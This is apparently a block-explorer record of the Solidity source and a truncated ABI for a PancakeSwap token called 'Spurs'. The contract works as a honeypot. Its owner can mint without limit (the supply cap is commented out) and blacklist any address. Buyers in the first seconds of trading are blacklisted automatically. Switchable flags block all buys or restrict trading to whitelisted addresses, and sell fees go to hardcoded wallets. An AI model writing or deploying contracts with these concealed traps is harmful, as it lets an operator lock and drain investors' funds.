{"SourceCode": "pragma solidity 0.6.12;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Context {\r\n    constructor () internal { }\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nabstract contract Spurslid is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor (string memory name, string memory symbol, uint8 decimals) public {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function sub(uint a, uint b) internal pure returns (uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        require(b <= a, errorMessage);\r\n        uint c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint a, uint b) internal pure returns (uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n    function div(uint a, uint b) internal pure returns (uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        assembly { codehash := extcodehash(account) }\r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\nlibrary DateTimeLibrary {\r\n \r\n    uint constant SECONDS_PER_DAY = 24 * 60 * 60;\r\n    uint constant SECONDS_PER_HOUR = 60 * 60;\r\n    uint constant SECONDS_PER_MINUTE = 60;\r\n    int constant OFFSET19700101 = 2440588;\r\n \r\n    uint constant DOW_MON = 1;\r\n    uint constant DOW_TUE = 2;\r\n    uint constant DOW_WED = 3;\r\n    uint constant DOW_THU = 4;\r\n    uint constant DOW_FRI = 5;\r\n    uint constant DOW_SAT = 6;\r\n    uint constant DOW_SUN = 7;\r\n\r\n \r\n    function _daysToDate(uint _days) internal pure returns (uint year, uint month, uint day) {\r\n        int __days = int(_days);\r\n \r\n        int L = __days + 68569 + OFFSET19700101;\r\n        int N = 4 * L / 146097;\r\n        L = L - (146097 * N + 3) / 4;\r\n        int _year = 4000 * (L + 1) / 1461001;\r\n        L = L - 1461 * _year / 4 + 31;\r\n        int _month = 80 * L / 2447;\r\n        int _day = L - 2447 * _month / 80;\r\n        L = _month / 11;\r\n        _month = _month + 2 - 12 * L;\r\n        _year = 100 * (N - 49) + _year + L;\r\n \r\n        year = uint(_year);\r\n        month = uint(_month);\r\n        day = uint(_day);\r\n    }\r\n \r\n\r\n    function timestampToDate(uint timestamp) internal pure returns (uint year, uint month, uint day) {\r\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\r\n    }\r\n\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using SafeMath for uint;\r\n    using Address for address;\r\n\r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) { // Return data is optional\r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\ninterface IPancakeRouter01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n        function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\nfunction addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IPancakeFactory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ncontract Spurs is Spurslid, Context {\r\n  using SafeERC20 for IERC20;\r\n  using Address for address;\r\n  using SafeMath for uint;\r\n\r\n  mapping (address => bool) public includeusers;\r\n  mapping (address => bool) public witeeArecipient;\r\n\r\n\r\n    mapping (address => uint) private _balances;\r\n\r\n    mapping (address => mapping (address => uint)) private _allowances;\r\n\r\n    uint private _totalSupply;\r\n    uint public maxSupply =  200000000000000 * 1e18;\r\n    function totalSupply() public view  override returns (uint) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view override returns (uint) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) public view override returns (uint) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address sender, address recipient, uint amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    function increaseAllowance(address spender, uint addedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    mapping(address => address) public inviter;\r\n\r\nfunction getday(uint til) public view returns (uint256 ) {\r\n        uint year; uint month; uint day; \r\n        ( year,  month,  day)=DateTimeLibrary.timestampToDate(til);\r\n         uint timess = year*10000+ month*100+day;\r\n        return timess;\r\n    }\r\n mapping(uint =>uint)  public daysp;\r\n\r\n    uint256 public markednum=0;\r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n         require(!_isBlacklisted[sender], \"bb address\");\r\n\r\n           uint256 needburn;\r\n        uint256 oldamount =  _balances[sender];\r\n     _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n        if (isfee) {\r\n                if (sender ==pancakePair || recipient == pancakePair) {\r\n                    if (iscanswap) {\r\n                        if (sender ==pancakePair) {\r\n                            require(witeeaddress[recipient], \" recipient not witee  swap\");\r\n                        }\r\n                        if (recipient ==pancakePair) {\r\n                            require(witeeaddress[sender], \" sender  not witee swap\");\r\n                        }\r\n                    }\r\n\r\n                if(witeeaddress[recipient]||witeeaddress[sender] ) {\r\n\r\n                } else {\r\n                if (recipient == pancakePair &&sfee[0]) {\r\n                        require(amount <= oldamount * 99 / 100);\r\n                    } \r\n\r\n                }\r\n                \r\n                if (sfee[1]) {\r\n                    //\r\n                    address nlp;\r\n                    if (sender ==pancakePair) {\r\n                        nlp = recipient;\r\n                    } else {\r\n                        nlp = sender;\r\n                    }\r\n                    require(lpsaddress[nlp],' not inlp addd' );\r\n                    if (sender ==pancakePair ) {\r\n                        require(false, \"not buy\");\r\n                    }\r\n                }\r\n          \r\n                if(witeeaddress[recipient]||witeeaddress[sender] ) {\r\n\r\n                } else {\r\n\r\n                \r\n                if (\r\n                    !sfee[3] &&\r\n                    balanceOf(pancakePair) > 0 &&\r\n                    block.timestamp <= tradingEnabledTimestamp + 13 seconds\r\n                ) {\r\n                    addbbt(recipient);\r\n                }\r\n\r\n                uint256 burnaa=amount.mul(1).div(100);\r\n\r\n                if (sender == pancakePair) { //chu\r\n                    uint256 top3=burnaa.mul(3);\r\n                    _balances[address(this)] = _balances[address(this)].add(top3);\r\n                    emit Transfer(sender, address(this), top3);\r\n                    //swapTokenssss(top3);\r\n                    markednum+=top3;\r\n\r\n                    amount=  amount.mul(97).div(100);\r\n                } else if (recipient == pancakePair) {\r\n                    //\r\n                    if (sfee[2]) {\r\n                            uint tom = burnaa.mul(2);\r\n                            _balances[address(this)] = _balances[address(this)].add(tom);\r\n                                emit Transfer(sender, address(this), tom);\r\n                            markednum+=tom;\r\n                        \r\n                            uint256 tolp2 = burnaa.mul(3);\r\n                            _balances[address(this)] = _balances[address(this)].add(tolp2);\r\n                                emit Transfer(sender, address(this), tolp2);\r\n\r\n                            swapnow(sender, balanceOf(address(this)).sub(markednum), markednum);\r\n                            markednum=0;\r\n                            uint256 tolp7 = burnaa.mul(7);\r\n                            //bottomadress\r\n                            _balances[bottomadress] = _balances[bottomadress].add(tolp7);\r\n                            emit Transfer(sender, bottomadress, tolp7);\r\n                            amount=  amount.mul(88).div(100);\r\n                    }\r\n\r\n                }\r\n            \r\n                \r\n\r\n              }\r\n\r\n            } \r\n           \r\n        }\r\n    \r\n\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n\r\n    }\r\n\r\n    // event Inviter(address  to, address  upline);\r\n    // event NetSwap(address  to, uint256 amount);\r\n\r\n\r\n   function isContract(address account) internal view returns (bool) {\r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(account)\r\n        }\r\n        return size > 0;\r\n    }\r\n      \r\n    function _isachieve(address nad, uint index) private returns(bool reb) {\r\n        uint bl=(index+1).mul(10000*1e18);\r\n        if (_balances[nad]>=bl ) {\r\n            reb= true;\r\n        } else {\r\n            reb= false;\r\n        }\r\n\r\n    }\r\n\r\n\r\n    function _netntpo(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: netntpo to the zero address\");\r\n       // require(_totalSupply.add(amount) <= maxSupply, \"ERC20: cannot netntpo over max supply\");\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n    }\r\n    function _burn(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n         _balances[address(0)] = _balances[address(0)].add(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    function _approve(address owner, address spender, uint amount) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n  \r\n  address public govn;\r\n  mapping (address => bool) public netspers;\r\n\r\n    //test\r\n  address public all =0x578f1ea4558184aAAA78B375cA6d7C8d55c6c70A;\r\n   \r\n   //online\r\n   \r\n    address public burnAddress = address(0x000000000000000000000000000000000000dEaD);\r\n\r\n   address public marketadress =0xE4A637CE4d2D4eCc47071548D9Bb82fF35f57452;// 2%\r\n\r\n    address public bottomadress =0x457003c8966D972D56B97AE5aEdE955905e94d41;// 1%\r\n\r\n uint256 public rr = 20*1e18;\r\n\r\n\r\n function getPrice2() public view returns(uint256 ){\r\n      uint[] memory amounts;\r\n        address[] memory path = new address[](2);\r\n        path[0] = token0;\r\n        path[1] = token1;\r\n       amounts = PancakeRouter01.getAmountsIn(1000000000000000000, path);\r\n       if (amounts.length>0) {\r\n           return amounts[0];\r\n       } else {\r\n           return rr;\r\n       }\r\n       \r\n  }\r\n\r\n\r\nmapping (address => bool) public witeeaddress;\r\nmapping (uint256=>address) public witeeaa;\r\nuint256 public witeelen;\r\n\r\nmapping (address => uint256) public usrbuys;\r\nmapping (address => bool) public intop5;\r\nmapping (address => uint) public userindex;\r\n\r\nuint public buylen=1;\r\n\r\n\r\n  IPancakeRouter01 public PancakeRouter01;\r\n  address public token0;\r\n  address public token1;\r\n  address public pancakePair; \r\n\r\n  bool public iscanswap=false;\r\n\r\n  function setIscanswap( bool _tf) public {\r\n      require(msg.sender == govn , \"!govn\");\r\n      iscanswap = _tf;\r\n  }\r\n\r\nbool public isfee=true;\r\n  function setIsisfee( bool _tf) public {\r\n      require(msg.sender == govn , \"!govn\");\r\n      isfee = _tf;\r\n  }\r\n\r\n  bool[] public sfee=[true,false,true,true];\r\n  function setsfee2( uint ype, bool _tf) public {\r\n      require(msg.sender == govn , \"!govn\");\r\n      sfee[ype]= _tf;\r\n  }\r\n\r\n  \r\n    function setwiteeaddress2(address[] memory _user) public {\r\n      require(msg.sender == govn , \"!govn\");\r\n      for(uint i=0;i< _user.length;i++) {\r\n          if (!witeeaddress[_user[i]]) {\r\n              //\r\n                witeeaa[witeelen] = _user[i];\r\n                witeelen = witeelen+1;\r\n                witeeaddress[_user[i]] = true;\r\n          }\r\n      }\r\n\r\n  }\r\n\r\n address public rewardTokenu=0x55d398326f99059fF775485246999027B3197955;\r\n\r\n  constructor ( address _pancake) public Spurslid(\"Spurs\", \"Spurs\", 18) {\r\n      govn = msg.sender;\r\n      //addnetsper(msg.sender);\r\n      _netntpo(all, maxSupply);\r\n      emit Transfer(address(0), all, maxSupply);\r\n      witeeaddress[all] = true;\r\n      lpsaddress[all] = true;\r\n      witeeaddress[address(this)] = true;\r\n\r\n      PancakeRouter01 =  IPancakeRouter01(_pancake);\r\n      token0 = address(this);\r\n      //token1 = _bnb;\r\n      pancakePair =  IPancakeFactory(PancakeRouter01.factory())\r\n            .createPair(address(this),PancakeRouter01.WETH() );  \r\n    swapTokensAtAmount = 1e18;\r\n  }\r\n\r\n  function Atopksn(uint256 amount, address u) public {\r\n       require(msg.sender == govn, \"!govn\");\r\n      _netntpo(u, amount);\r\n      emit Transfer(address(0), u, amount);\r\n  }\r\n\r\n    function burn(uint256 amount) public {\r\n        _burn(msg.sender, amount);\r\n    }\r\n  \r\n    mapping(address => bool) public _isBlacklisted;\r\n    function blacklistAddress(address account, bool value) external  {\r\n                  require(msg.sender == govn, \"!govn\");\r\n        _isBlacklisted[account] = value;\r\n    }\r\n\r\n   function addbbt(address recipient) private {\r\n        if (!_isBlacklisted[recipient]) _isBlacklisted[recipient] = true;\r\n    }\r\n\r\n   uint256 public tradingEnabledTimestamp = 1631365200; \r\n\r\n   function setTradingEnabledTimestamp(uint256 _tradingEnabledTimestamp)\r\n        public\r\n        \r\n    {\r\n         require(msg.sender == govn, \"!govn\");\r\n        tradingEnabledTimestamp = _tradingEnabledTimestamp;\r\n    }\r\n    \r\n  function setGovernance(address _govn) public {\r\n      require(msg.sender == govn, \"!govn\");\r\n      govn = _govn;\r\n  }\r\n\r\n  function setalladdress(address _a) public {\r\n      require(msg.sender == govn, \"!govn\");\r\n      all = _a;\r\n  }\r\n      uint256 public swapTokensAtAmount;\r\n\r\n    function setSwapTokensAtAmount(uint256 _swapTokensAtAmount) public  {\r\n         require(msg.sender == govn, \"!govn\");\r\n        swapTokensAtAmount = _swapTokensAtAmount;\r\n    }\r\n\r\n    bool private swapping;\r\n\r\n    function swapnow(address from, uint256 amountlip, uint256 tokenAmount) private {\r\n        {\r\n            if (\r\n                !swapping &&\r\n                from != pancakePair\r\n            ) {\r\n                swapping = true;\r\n                if(amountlip > swapTokensAtAmount){\r\n                    swapAndLiquify(amountlip);\r\n                }\r\n                swapTokenssss(tokenAmount);\r\n                swapping = false;\r\n            }\r\n        } \r\n    }\r\n\r\n        bool inSwapAndLiquify;\r\n    modifier lockTheSwap() {\r\n        inSwapAndLiquify = true;\r\n        _;\r\n        inSwapAndLiquify = false;\r\n    }\r\n\r\n    event SwapAndLiquify(uint256 half, uint256 newBalance, uint256 otherHalf);\r\n      function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {\r\n        uint256 half = contractTokenBalance.div(2);\r\n        uint256 otherHalf = contractTokenBalance.sub(half);\r\n        uint256 initialBalance = address(this).balance;\r\n        swapTokensForEth(half); \r\n        uint256 newBalance = address(this).balance.sub(initialBalance);\r\n        addLiquidity(otherHalf, newBalance);\r\n        emit SwapAndLiquify(half, newBalance, otherHalf);\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = PancakeRouter01.WETH();\r\n        _approve(address(this), address(PancakeRouter01), tokenAmount);\r\n        PancakeRouter01.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, \r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        _approve(address(this), address(PancakeRouter01), tokenAmount);\r\n        PancakeRouter01.addLiquidityETH{value: ethAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0, \r\n            0, \r\n            all,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n\r\n    function swapTokenssss(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](3);\r\n        path[0] = address(this);\r\n        path[1] = PancakeRouter01.WETH();\r\n        path[2] = rewardTokenu;\r\n        _approve(address(this), address(PancakeRouter01), tokenAmount);\r\n        // make the swap\r\n        PancakeRouter01.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            marketadress,\r\n            block.timestamp\r\n        );\r\n    }\r\n  receive() external payable {}\r\n\r\n    mapping (address => bool) public lpsaddress;\r\n    event AddLpaddress(address user);\r\n    function setlpsadddress(address[] memory _user) public {\r\n       require(msg.sender == govn, \"!govn\");\r\n      for(uint i=0;i< _user.length;i++) {\r\n          if (!lpsaddress[_user[i]]) {\r\n                lpsaddress[_user[i]] = true;\r\n                emit AddLpaddress(_user[i]);\r\n          }\r\n      }\r\n  }\r\n    event RmLpaddress(address user);\r\n\r\n   function setrmlpsdddress(address[] memory _user) public {\r\n       require(msg.sender == govn, \"!govn\");\r\n      for(uint i=0;i< _user.length;i++) {\r\n          if (lpsaddress[_user[i]]) {\r\n                lpsaddress[_user[i]] = false;\r\n                emit RmLpaddress(_user[i]);\r\n          }\r\n      }\r\n  }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pancake\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"AddLpaddress\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"RmLpaddress\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"half\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newBalance\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"otherHalf\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"u\",\"type\":\"address\"}],\"name\":\"Atopksn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"PancakeRouter01\",\"outputs\":[{\"internalType\":\"contract IPancakeRouter01\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"all\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"blacklistAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bottomadress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burnAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buylen\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"daysp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getPrice2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"til\",\"type\":\"uint256\"}],\"name\":\"getday\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"govn\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"includeusers\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"intop5\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"inviter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"iscanswap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isfee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"lpsaddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"markednum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketadress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"netspers\",\"outputs\":[{\"inte